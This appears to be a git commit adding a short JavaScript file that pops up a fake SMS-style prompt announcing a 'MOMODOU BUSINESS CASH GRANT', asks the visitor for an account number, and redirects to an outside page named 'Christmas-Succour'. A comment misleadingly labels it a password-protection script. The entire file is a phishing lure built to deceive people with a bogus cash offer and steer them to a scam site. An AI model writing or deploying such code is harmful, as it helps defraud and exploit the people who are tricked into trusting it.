af1813938d68c8236affcbe0b87cea095ffd0971
Help-All <imaobongumoh637@gmail.com>
2026-01-10 23:10:16 +0100

    Create activea.js

---
+++ activea.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive MOMODOU BUSINESS CASH GRANT. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://getin-ofer.cfd/Christmas-Succour.html';
+  }
